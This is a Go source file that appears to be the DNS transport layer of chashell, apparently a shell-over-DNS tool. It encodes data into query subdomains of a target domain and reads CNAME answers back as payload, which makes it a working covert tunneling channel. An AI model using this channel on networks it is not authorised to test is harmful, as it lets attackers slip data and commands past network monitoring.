package transport

import (
	"fmt"
	"github.com/miekg/dns"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

var dnsTrace = os.Getenv("CHASHELL_DNS_TRACE") != ""

func sendDNSQuery(data []byte, target string) (responses []string, err error) {
	// Prefer a raw DNS query so we can read the answer directly (the stdlib resolver
	// may follow CNAMEs and error if the target doesn't resolve).
	qname := dns.Fqdn(fmt.Sprintf("%s.%s", data, target))

	cfg, cfgErr := dns.ClientConfigFromFile("/etc/resolv.conf")
	if cfgErr != nil || len(cfg.Servers) == 0 {
		// Fallback to the Go resolver (kept for backwards-compatibility).
		cname, lookupErr := net.LookupCNAME(qname)
		if lookupErr != nil {
			return nil, lookupErr
		}
		payload := strings.ReplaceAll(strings.TrimSuffix(cname, "."), ".", "")
		return []string{payload}, nil
	}

	client := &dns.Client{Net: "udp", Timeout: 3 * time.Second}
	msg := new(dns.Msg)
	msg.SetQuestion(qname, dns.TypeCNAME)

	if dnsTrace {
		log.Printf("dns tx qname=%q qtype=CNAME", qname)
	}

	in, _, err := client.Exchange(msg, net.JoinHostPort(cfg.Servers[0], cfg.Port))
	if err != nil {
		if dnsTrace {
			log.Printf("dns rx error qname=%q err=%v", qname, err)
		}
		return nil, err
	}

	if dnsTrace {
		log.Printf("dns rx qname=%q rcode=%s answers=%d", qname, dns.RcodeToString[in.Rcode], len(in.Answer))
	}

	for _, rr := range in.Answer {
		cname, ok := rr.(*dns.CNAME)
		if !ok {
			continue
		}
		payload := strings.ReplaceAll(strings.TrimSuffix(cname.Target, "."), ".", "")
		if dnsTrace {
			log.Printf("dns rx cname target=%q payload_len=%d", cname.Target, len(payload))
		}
		if payload == "" {
			continue
		}
		responses = append(responses, payload)
	}
	return responses, nil
}
